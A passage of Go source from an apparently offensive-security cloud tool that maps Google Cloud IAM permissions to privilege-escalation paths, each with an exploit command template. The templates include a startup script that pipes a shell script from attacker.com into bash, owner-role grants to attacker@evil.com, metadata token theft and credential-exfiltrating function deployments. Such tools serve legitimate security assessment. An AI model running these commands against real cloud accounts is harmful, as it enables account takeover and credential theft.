package privescservice

import (
	"context"
	"fmt"
	"strings"

	iampb "cloud.google.com/go/iam/apiv1/iampb"
	resourcemanager "cloud.google.com/go/resourcemanager/apiv3"
	resourcemanagerpb "cloud.google.com/go/resourcemanager/apiv3/resourcemanagerpb"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	crmv1 "google.golang.org/api/cloudresourcemanager/v1"
	"google.golang.org/api/iam/v1"
	"google.golang.org/api/iterator"
)

type PrivescService struct {
	session *gcpinternal.SafeSession
}

var logger = internal.NewLogger()

func New() *PrivescService {
	return &PrivescService{}
}

func NewWithSession(session *gcpinternal.SafeSession) *PrivescService {
	return &PrivescService{session: session}
}

// PrivescPath represents a privilege escalation opportunity
type PrivescPath struct {
	Principal      string   `json:"principal"`      // Who has this capability
	PrincipalType  string   `json:"principalType"`  // user, serviceAccount, group
	Method         string   `json:"method"`         // The privesc method name
	TargetResource string   `json:"targetResource"` // What resource they can escalate on
	Permissions    []string `json:"permissions"`    // Permissions enabling this
	RiskLevel      string   `json:"riskLevel"`      // CRITICAL, HIGH, MEDIUM
	Description    string   `json:"description"`    // Explanation
	ExploitCommand string   `json:"exploitCommand"` // Command to exploit
	ProjectID      string   `json:"projectId"`
	// Scope information - where the role binding exists
	ScopeType string `json:"scopeType"` // organization, folder, project
	ScopeID   string `json:"scopeId"`   // The org/folder/project ID where binding exists
	ScopeName string `json:"scopeName"` // Display name of the scope
}

// CombinedPrivescData holds all privesc data across org/folder/project levels
type CombinedPrivescData struct {
	OrgPaths     []PrivescPath         `json:"orgPaths"`
	FolderPaths  []PrivescPath         `json:"folderPaths"`
	ProjectPaths []PrivescPath         `json:"projectPaths"`
	AllPaths     []PrivescPath         `json:"allPaths"`
	OrgNames     map[string]string     `json:"orgNames"`
	FolderNames  map[string]string     `json:"folderNames"`
	OrgIDs       []string              `json:"orgIds"`
}

// DangerousPermission represents a permission that enables privilege escalation
type DangerousPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`    // SA Impersonation, Key Creation, IAM Modification, etc.
	RiskLevel   string `json:"riskLevel"`   // CRITICAL, HIGH, MEDIUM
	Description string `json:"description"` // What this enables
}

// GetDangerousPermissions returns the list of known dangerous GCP permissions
// Based on: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
// and: https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
func GetDangerousPermissions() []DangerousPermission {
	return []DangerousPermission{
		// Service Account Impersonation - CRITICAL
		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate access tokens for any SA"},
		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign blobs as SA (GCS signed URLs)"},
		{Permission: "iam.serviceAccounts.signJwt", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign JWTs as SA (impersonation)"},
		{Permission: "iam.serviceAccounts.implicitDelegation", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Delegate SA identity to others"},

		// Key Creation - CRITICAL
		{Permission: "iam.serviceAccountKeys.create", Category: "Key Creation", RiskLevel: "CRITICAL", Description: "Create persistent SA keys"},
		{Permission: "storage.hmacKeys.create", Category: "Key Creation", RiskLevel: "HIGH", Description: "Create HMAC keys for S3-compatible access"},

		// IAM Modification - CRITICAL
		{Permission: "resourcemanager.projects.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify project-level IAM policy"},
		{Permission: "resourcemanager.folders.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify folder-level IAM policy"},
		{Permission: "resourcemanager.organizations.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify org-level IAM policy"},
		{Permission: "iam.serviceAccounts.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Grant access to service accounts"},
		{Permission: "iam.roles.update", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify custom role permissions"},
		{Permission: "iam.roles.create", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Create new custom roles"},

		// Compute Access - HIGH
		{Permission: "compute.instances.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create compute instances"},
		{Permission: "compute.instances.setMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Modify instance metadata (SSH keys, startup scripts)"},
		{Permission: "compute.instances.setServiceAccount", Category: "Compute", RiskLevel: "HIGH", Description: "Change instance service account"},
		{Permission: "compute.disks.create", Category: "Compute", RiskLevel: "MEDIUM", Description: "Create compute disks"},
		{Permission: "compute.subnetworks.use", Category: "Compute", RiskLevel: "MEDIUM", Description: "Use subnetworks for instances"},
		{Permission: "compute.subnetworks.useExternalIp", Category: "Compute", RiskLevel: "MEDIUM", Description: "Assign external IPs to instances"},
		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Modify project-wide metadata"},
		{Permission: "compute.instances.osLogin", Category: "Compute", RiskLevel: "MEDIUM", Description: "SSH into instances via OS Login"},
		{Permission: "compute.instances.osAdminLogin", Category: "Compute", RiskLevel: "HIGH", Description: "SSH with sudo via OS Login"},

		// Cloud Functions - HIGH
		{Permission: "cloudfunctions.functions.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy functions with SA identity"},
		{Permission: "cloudfunctions.functions.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function code/SA"},
		{Permission: "cloudfunctions.functions.sourceCodeSet", Category: "Serverless", RiskLevel: "HIGH", Description: "Change function source code"},
		{Permission: "cloudfunctions.functions.call", Category: "Serverless", RiskLevel: "MEDIUM", Description: "Invoke cloud functions"},
		{Permission: "cloudfunctions.functions.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function IAM policy (make public)"},

		// Cloud Run - HIGH
		{Permission: "run.services.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy services with SA identity"},
		{Permission: "run.services.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service code/SA"},
		{Permission: "run.services.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service IAM policy (make public)"},
		{Permission: "run.routes.invoke", Category: "Serverless", RiskLevel: "MEDIUM", Description: "Invoke Cloud Run services"},

		// Cloud Build - HIGH
		{Permission: "cloudbuild.builds.create", Category: "CI/CD", RiskLevel: "CRITICAL", Description: "Run builds with Cloud Build SA"},
		{Permission: "cloudbuild.builds.update", Category: "CI/CD", RiskLevel: "HIGH", Description: "Modify build configurations"},

		// Cloud Scheduler - HIGH
		{Permission: "cloudscheduler.jobs.create", Category: "Scheduler", RiskLevel: "HIGH", Description: "Create scheduled jobs with SA identity"},
		{Permission: "cloudscheduler.locations.list", Category: "Scheduler", RiskLevel: "LOW", Description: "List scheduler locations"},

		// GKE - HIGH
		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get GKE cluster credentials"},
		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Exec into pods"},
		{Permission: "container.secrets.get", Category: "GKE", RiskLevel: "HIGH", Description: "Read Kubernetes secrets"},

		// Storage - MEDIUM
		{Permission: "storage.buckets.setIamPolicy", Category: "Storage", RiskLevel: "MEDIUM", Description: "Modify bucket access"},
		{Permission: "storage.objects.create", Category: "Storage", RiskLevel: "MEDIUM", Description: "Upload objects to buckets"},

		// Secrets - HIGH
		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "HIGH", Description: "Access secret values"},
		{Permission: "secretmanager.secrets.setIamPolicy", Category: "Secrets", RiskLevel: "HIGH", Description: "Grant access to secrets"},

		// Org Policies - CRITICAL
		{Permission: "orgpolicy.policy.set", Category: "Org Policy", RiskLevel: "CRITICAL", Description: "Disable organization policy constraints"},

		// Deployment Manager - CRITICAL
		{Permission: "deploymentmanager.deployments.create", Category: "Deployment", RiskLevel: "CRITICAL", Description: "Deploy arbitrary infrastructure with DM SA"},

		// API Keys - MEDIUM
		{Permission: "serviceusage.apiKeys.create", Category: "API Keys", RiskLevel: "HIGH", Description: "Create API keys for project access"},
		{Permission: "serviceusage.apiKeys.list", Category: "API Keys", RiskLevel: "MEDIUM", Description: "List existing API keys"},

		// Actor permissions
		{Permission: "iam.serviceAccounts.actAs", Category: "SA Usage", RiskLevel: "HIGH", Description: "Use SA for resource creation"},
	}
}

// AnalyzeProjectPrivesc analyzes a project for privilege escalation paths
func (s *PrivescService) AnalyzeProjectPrivesc(projectID string) ([]PrivescPath, error) {
	return s.AnalyzeProjectPrivescWithName(projectID, projectID)
}

// AnalyzeProjectPrivescWithName analyzes a project for privilege escalation paths with display name
func (s *PrivescService) AnalyzeProjectPrivescWithName(projectID, projectName string) ([]PrivescPath, error) {
	ctx := context.Background()

	// Get project IAM policy
	var crmService *crmv1.Service
	var err error

	if s.session != nil {
		crmService, err = crmv1.NewService(ctx, s.session.GetClientOption())
	} else {
		crmService, err = crmv1.NewService(ctx)
	}
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	policy, err := crmService.Projects.GetIamPolicy(projectID, &crmv1.GetIamPolicyRequest{}).Do()
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	var paths []PrivescPath

	// Get IAM service for role resolution
	var iamService *iam.Service
	if s.session != nil {
		iamService, err = iam.NewService(ctx, s.session.GetClientOption())
	} else {
		iamService, err = iam.NewService(ctx)
	}
	if err != nil {
		// Continue without role resolution
		iamService = nil
	}

	// Analyze each binding
	for _, binding := range policy.Bindings {
		if binding == nil {
			continue
		}

		// Get permissions for this role
		permissions := s.getRolePermissions(iamService, binding.Role, projectID)

		// Check each member for dangerous permissions
		for _, member := range binding.Members {
			memberPaths := s.analyzePermissionsForPrivescWithScope(member, binding.Role, permissions, projectID, "project", projectID, projectName)
			paths = append(paths, memberPaths...)
		}
	}

	return paths, nil
}

// getRolePermissions resolves a role to its permissions
func (s *PrivescService) getRolePermissions(iamService *iam.Service, role string, projectID string) []string {
	if iamService == nil {
		return []string{}
	}

	ctx := context.Background()

	// Handle different role types
	var roleInfo *iam.Role
	var err error

	if strings.HasPrefix(role, "roles/") {
		// Predefined role
		roleInfo, err = iamService.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "projects/") {
		// Project custom role
		roleInfo, err = iamService.Projects.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "organizations/") {
		// Org custom role
		roleInfo, err = iamService.Organizations.Roles.Get(role).Do()
	} else {
		// Assume predefined role format
		roleInfo, err = iamService.Roles.Get("roles/" + role).Do()
	}

	if err != nil {
		// Try to query testable permissions as fallback
		return s.getTestablePermissions(ctx, iamService, role, projectID)
	}

	return roleInfo.IncludedPermissions
}

// getTestablePermissions uses QueryTestablePermissions for complex cases
func (s *PrivescService) getTestablePermissions(ctx context.Context, iamService *iam.Service, role string, projectID string) []string {
	// This is a simplified version - in production you'd want more robust handling
	// For now, return known permissions for common roles
	knownRoles := map[string][]string{
		"roles/owner": {
			"iam.serviceAccounts.getAccessToken",
			"iam.serviceAccountKeys.create",
			"resourcemanager.projects.setIamPolicy",
			"compute.instances.setMetadata",
		},
		"roles/editor": {
			"compute.instances.setMetadata",
			"cloudfunctions.functions.create",
			"run.services.create",
		},
		"roles/iam.serviceAccountAdmin": {
			"iam.serviceAccountKeys.create",
			"iam.serviceAccounts.setIamPolicy",
		},
		"roles/iam.serviceAccountKeyAdmin": {
			"iam.serviceAccountKeys.create",
		},
		"roles/iam.serviceAccountTokenCreator": {
			"iam.serviceAccounts.getAccessToken",
			"iam.serviceAccounts.signBlob",
			"iam.serviceAccounts.signJwt",
		},
		"roles/compute.instanceAdmin": {
			"compute.instances.setMetadata",
			"compute.instances.setServiceAccount",
		},
		"roles/cloudfunctions.developer": {
			"cloudfunctions.functions.create",
			"cloudfunctions.functions.update",
		},
		"roles/run.admin": {
			"run.services.create",
			"run.services.update",
		},
		"roles/cloudbuild.builds.editor": {
			"cloudbuild.builds.create",
		},
	}

	if perms, ok := knownRoles[role]; ok {
		return perms
	}

	return []string{}
}

// analyzePermissionsForPrivesc checks if a set of permissions enables privilege escalation
func (s *PrivescService) analyzePermissionsForPrivesc(member, role string, permissions []string, projectID string) []PrivescPath {
	var paths []PrivescPath

	dangerousPerms := GetDangerousPermissions()
	dangerousMap := make(map[string]DangerousPermission)
	for _, dp := range dangerousPerms {
		dangerousMap[dp.Permission] = dp
	}

	// Check for direct dangerous permissions
	foundDangerous := make(map[string]DangerousPermission)
	permSet := make(map[string]bool)
	for _, perm := range permissions {
		permSet[perm] = true
		if dp, ok := dangerousMap[perm]; ok {
			foundDangerous[perm] = dp
		}
	}

	// Helper to check if permission exists
	hasPerm := func(perm string) bool {
		return permSet[perm]
	}

	// Generate privesc paths based on found permissions
	principalType := getPrincipalType(member)
	cleanMember := cleanMemberName(member)

	// ========================================
	// SERVICE ACCOUNT IMPERSONATION - CRITICAL
	// ========================================

	// SA Token Creation (GetServiceAccountAccessToken)
	if dp, ok := foundDangerous["iam.serviceAccounts.getAccessToken"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "GetServiceAccountAccessToken",
			TargetResource: "All project service accounts",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can generate access tokens for service accounts to impersonate them",
			ExploitCommand: fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID),
			ProjectID:      projectID,
		})
	}

	// SA Key Creation (CreateServiceAccountKey)
	if dp, ok := foundDangerous["iam.serviceAccountKeys.create"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "CreateServiceAccountKey",
			TargetResource: "All project service accounts",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can create persistent keys for service accounts to impersonate them",
			ExploitCommand: fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID),
			ProjectID:      projectID,
		})
	}

	// SA Implicit Delegation (ServiceAccountImplicitDelegation)
	if dp, ok := foundDangerous["iam.serviceAccounts.implicitDelegation"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ServiceAccountImplicitDelegation",
			TargetResource: "All project service accounts",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can delegate permissions between service accounts for chained impersonation",
			ExploitCommand: "# Use delegation chain: SA1 -> SA2 -> SA3\ngcloud auth print-access-token --impersonate-service-account=SA3 --delegates=SA1,SA2",
			ProjectID:      projectID,
		})
	}

	// SA SignBlob (ServiceAccountSignBlob)
	if dp, ok := foundDangerous["iam.serviceAccounts.signBlob"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ServiceAccountSignBlob",
			TargetResource: "All project service accounts",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can sign arbitrary blobs as SA (create GCS signed URLs, forge tokens)",
			ExploitCommand: fmt.Sprintf("gsutil signurl -u TARGET_SA@%s.iam.gserviceaccount.com gs://bucket/object", projectID),
			ProjectID:      projectID,
		})
	}

	// SA SignJwt (ServiceAccountSignJwt)
	if dp, ok := foundDangerous["iam.serviceAccounts.signJwt"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ServiceAccountSignJwt",
			TargetResource: "All project service accounts",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can sign JWTs as SA to impersonate service accounts",
			ExploitCommand: "# Sign JWT to get access token as SA\ncurl -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"payload\": \"...\"}' \\\n  https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA:signJwt",
			ProjectID:      projectID,
		})
	}

	// ========================================
	// KEY CREATION
	// ========================================

	// HMAC Key Creation (CreateServiceAccountHMACKey)
	if dp, ok := foundDangerous["storage.hmacKeys.create"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "CreateServiceAccountHMACKey",
			TargetResource: "All project service accounts",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can create HMAC keys for S3-compatible API access as service account",
			ExploitCommand: fmt.Sprintf("gsutil hmac create TARGET_SA@%s.iam.gserviceaccount.com", projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// IAM POLICY MODIFICATION - CRITICAL
	// ========================================

	// Project IAM Modification (SetProjectIAMPolicy)
	if dp, ok := foundDangerous["resourcemanager.projects.setIamPolicy"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "SetProjectIAMPolicy",
			TargetResource: projectID,
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can modify project IAM policy to grant any role",
			ExploitCommand: fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member=user:attacker@evil.com --role=roles/owner", projectID),
			ProjectID:      projectID,
		})
	}

	// Folder IAM Modification (SetFolderIAMPolicy)
	if dp, ok := foundDangerous["resourcemanager.folders.setIamPolicy"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "SetFolderIAMPolicy",
			TargetResource: "Folder (inherited to all projects)",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can modify folder IAM policy affecting all child projects",
			ExploitCommand: "gcloud resource-manager folders add-iam-policy-binding FOLDER_ID --member=user:attacker@evil.com --role=roles/owner",
			ProjectID:      projectID,
		})
	}

	// Org IAM Modification (SetOrgIAMPolicy)
	if dp, ok := foundDangerous["resourcemanager.organizations.setIamPolicy"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "SetOrgIAMPolicy",
			TargetResource: "Organization (inherited to all)",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can modify organization IAM policy affecting all folders and projects",
			ExploitCommand: "gcloud organizations add-iam-policy-binding ORG_ID --member=user:attacker@evil.com --role=roles/owner",
			ProjectID:      projectID,
		})
	}

	// Service Account IAM Modification (SetServiceAccountIAMPolicy)
	if dp, ok := foundDangerous["iam.serviceAccounts.setIamPolicy"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "SetServiceAccountIAMPolicy",
			TargetResource: "All project service accounts",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can grant others access to impersonate service accounts",
			ExploitCommand: fmt.Sprintf("gcloud iam service-accounts add-iam-policy-binding TARGET_SA@%s.iam.gserviceaccount.com --member=user:attacker@evil.com --role=roles/iam.serviceAccountTokenCreator", projectID),
			ProjectID:      projectID,
		})
	}

	// Update IAM Role (UpdateIAMRole)
	if dp, ok := foundDangerous["iam.roles.update"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "UpdateIAMRole",
			TargetResource: "Custom IAM roles",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can modify custom IAM roles to add powerful permissions",
			ExploitCommand: fmt.Sprintf("gcloud iam roles update ROLE_ID --project=%s --add-permissions=iam.serviceAccountKeys.create", projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// ORG POLICY - CRITICAL
	// ========================================

	// Org Policy Modification (SetOrgPolicyConstraints)
	if dp, ok := foundDangerous["orgpolicy.policy.set"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "SetOrgPolicyConstraints",
			TargetResource: "Organization policies",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can disable organization policy constraints (domain restriction, public access prevention, etc.)",
			ExploitCommand: "gcloud org-policies reset constraints/iam.allowedPolicyMemberDomains --project=" + projectID,
			ProjectID:      projectID,
		})
	}

	// ========================================
	// COMPUTE - HIGH
	// ========================================

	// Compute Metadata Modification
	if dp, ok := foundDangerous["compute.instances.setMetadata"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ComputeMetadataInjection",
			TargetResource: "All project instances",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can inject SSH keys or startup scripts into instances",
			ExploitCommand: fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --project=%s --metadata=startup-script='#!/bin/bash\\ncurl http://attacker.com/shell.sh | bash'", projectID),
			ProjectID:      projectID,
		})
	}

	// Create GCE Instance with SA (CreateGCEInstanceWithSA)
	// Requires multiple permissions working together
	if hasPerm("compute.instances.create") && hasPerm("iam.serviceAccounts.actAs") {
		requiredPerms := []string{"compute.instances.create", "iam.serviceAccounts.actAs"}
		// Check for additional required permissions
		hasAllPerms := true
		optionalPerms := []string{"compute.disks.create", "compute.instances.setMetadata", "compute.instances.setServiceAccount", "compute.subnetworks.use"}
		for _, p := range optionalPerms {
			if hasPerm(p) {
				requiredPerms = append(requiredPerms, p)
			}
		}
		if hasAllPerms {
			paths = append(paths, PrivescPath{
				Principal:      cleanMember,
				PrincipalType:  principalType,
				Method:         "CreateGCEInstanceWithSA",
				TargetResource: "Compute instances with privileged SA",
				Permissions:    requiredPerms,
				RiskLevel:      "CRITICAL",
				Description:    "Can create GCE instance with privileged service account to steal its token",
				ExploitCommand: fmt.Sprintf("gcloud compute instances create attacker-vm --project=%s --service-account=PRIVILEGED_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --metadata=startup-script='curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H \"Metadata-Flavor: Google\"'", projectID, projectID),
				ProjectID:      projectID,
			})
		}
	}

	// OS Admin Login
	if dp, ok := foundDangerous["compute.instances.osAdminLogin"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "OSAdminLogin",
			TargetResource: "All project instances with OS Login",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can SSH into instances with sudo via OS Login",
			ExploitCommand: fmt.Sprintf("gcloud compute ssh INSTANCE --project=%s", projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// SERVERLESS - CRITICAL/HIGH
	// ========================================

	// Cloud Functions - Create with SA (ExfilCloudFunctionCredsAuthCall)
	if hasPerm("cloudfunctions.functions.create") && hasPerm("iam.serviceAccounts.actAs") {
		perms := []string{"cloudfunctions.functions.create", "iam.serviceAccounts.actAs"}
		if hasPerm("cloudfunctions.functions.sourceCodeSet") {
			perms = append(perms, "cloudfunctions.functions.sourceCodeSet")
		}
		method := "ExfilCloudFunctionCredsAuthCall"
		desc := "Can deploy function with privileged SA and invoke it to exfiltrate credentials"
		if hasPerm("cloudfunctions.functions.call") {
			perms = append(perms, "cloudfunctions.functions.call")
		}
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         method,
			TargetResource: "Cloud Functions",
			Permissions:    perms,
			RiskLevel:      "CRITICAL",
			Description:    desc,
			ExploitCommand: fmt.Sprintf("gcloud functions deploy exfil --project=%s --runtime=python39 --trigger-http --service-account=PRIVILEGED_SA@%s.iam.gserviceaccount.com --source=. --entry-point=exfil", projectID, projectID),
			ProjectID:      projectID,
		})
	}

	// Cloud Functions - Create with SA and make public (ExfilCloudFunctionCredsUnauthCall)
	if hasPerm("cloudfunctions.functions.create") && hasPerm("iam.serviceAccounts.actAs") && hasPerm("cloudfunctions.functions.setIamPolicy") {
		perms := []string{"cloudfunctions.functions.create", "iam.serviceAccounts.actAs", "cloudfunctions.functions.setIamPolicy"}
		if hasPerm("cloudfunctions.functions.sourceCodeSet") {
			perms = append(perms, "cloudfunctions.functions.sourceCodeSet")
		}
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ExfilCloudFunctionCredsUnauthCall",
			TargetResource: "Cloud Functions (public)",
			Permissions:    perms,
			RiskLevel:      "CRITICAL",
			Description:    "Can deploy function with privileged SA and make it publicly accessible",
			ExploitCommand: fmt.Sprintf("gcloud functions deploy exfil --project=%s --runtime=python39 --trigger-http --service-account=PRIVILEGED_SA --allow-unauthenticated", projectID),
			ProjectID:      projectID,
		})
	}

	// Cloud Functions - Update existing function (UpdateCloudFunction)
	if hasPerm("cloudfunctions.functions.update") && hasPerm("iam.serviceAccounts.actAs") {
		perms := []string{"cloudfunctions.functions.update", "iam.serviceAccounts.actAs"}
		if hasPerm("cloudfunctions.functions.sourceCodeSet") {
			perms = append(perms, "cloudfunctions.functions.sourceCodeSet")
		}
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "UpdateCloudFunction",
			TargetResource: "Existing Cloud Functions",
			Permissions:    perms,
			RiskLevel:      "CRITICAL",
			Description:    "Can update existing Cloud Functions with malicious code",
			ExploitCommand: fmt.Sprintf("gcloud functions deploy EXISTING_FUNCTION --project=%s --source=. --entry-point=malicious", projectID),
			ProjectID:      projectID,
		})
	}

	// Cloud Run - Create with SA (ExfilCloudRunServiceAuthCall)
	if hasPerm("run.services.create") && hasPerm("iam.serviceAccounts.actAs") {
		perms := []string{"run.services.create", "iam.serviceAccounts.actAs"}
		if hasPerm("run.routes.invoke") {
			perms = append(perms, "run.routes.invoke")
		}
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ExfilCloudRunServiceAuthCall",
			TargetResource: "Cloud Run",
			Permissions:    perms,
			RiskLevel:      "CRITICAL",
			Description:    "Can deploy Cloud Run service with privileged SA to exfiltrate credentials",
			ExploitCommand: fmt.Sprintf("gcloud run deploy exfil --project=%s --image=gcr.io/attacker/exfil --service-account=PRIVILEGED_SA@%s.iam.gserviceaccount.com --platform=managed --region=us-central1", projectID, projectID),
			ProjectID:      projectID,
		})
	}

	// Cloud Run - Create with SA and make public (ExfilCloudRunServiceUnauthCall)
	if hasPerm("run.services.create") && hasPerm("iam.serviceAccounts.actAs") && hasPerm("run.services.setIamPolicy") {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ExfilCloudRunServiceUnauthCall",
			TargetResource: "Cloud Run (public)",
			Permissions:    []string{"run.services.create", "iam.serviceAccounts.actAs", "run.services.setIamPolicy"},
			RiskLevel:      "CRITICAL",
			Description:    "Can deploy Cloud Run service with privileged SA and make it publicly accessible",
			ExploitCommand: fmt.Sprintf("gcloud run deploy exfil --project=%s --image=gcr.io/attacker/exfil --service-account=PRIVILEGED_SA --allow-unauthenticated --platform=managed --region=us-central1", projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// CI/CD - CRITICAL
	// ========================================

	// Cloud Build (RCECloudBuildBuildServer)
	if dp, ok := foundDangerous["cloudbuild.builds.create"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "RCECloudBuildBuildServer",
			TargetResource: "Cloud Build",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can execute arbitrary code via Cloud Build with its service account (often has elevated privileges)",
			ExploitCommand: fmt.Sprintf("gcloud builds submit --project=%s --config=cloudbuild.yaml .", projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// SCHEDULER - HIGH
	// ========================================

	// Cloud Scheduler (CreateCloudSchedulerHTTPRequest)
	if hasPerm("cloudscheduler.jobs.create") && hasPerm("iam.serviceAccounts.actAs") {
		perms := []string{"cloudscheduler.jobs.create", "iam.serviceAccounts.actAs"}
		if hasPerm("cloudscheduler.locations.list") {
			perms = append(perms, "cloudscheduler.locations.list")
		}
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "CreateCloudSchedulerHTTPRequest",
			TargetResource: "Cloud Scheduler",
			Permissions:    perms,
			RiskLevel:      "HIGH",
			Description:    "Can create scheduled HTTP requests that run as privileged service account",
			ExploitCommand: fmt.Sprintf("gcloud scheduler jobs create http exfil --project=%s --schedule='* * * * *' --uri=https://attacker.com/callback --oidc-service-account-email=PRIVILEGED_SA@%s.iam.gserviceaccount.com", projectID, projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// DEPLOYMENT MANAGER - CRITICAL
	// ========================================

	// Deployment Manager (CreateDeploymentManagerDeployment)
	if dp, ok := foundDangerous["deploymentmanager.deployments.create"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "CreateDeploymentManagerDeployment",
			TargetResource: "Deployment Manager",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "CRITICAL",
			Description:    "Can deploy arbitrary infrastructure with Deployment Manager service account (often has project owner)",
			ExploitCommand: fmt.Sprintf("gcloud deployment-manager deployments create pwned --project=%s --config=deployment.yaml", projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// GKE - HIGH
	// ========================================

	// GKE Credentials
	if dp, ok := foundDangerous["container.clusters.getCredentials"]; ok {
		paths = append(paths, PrivescPath{
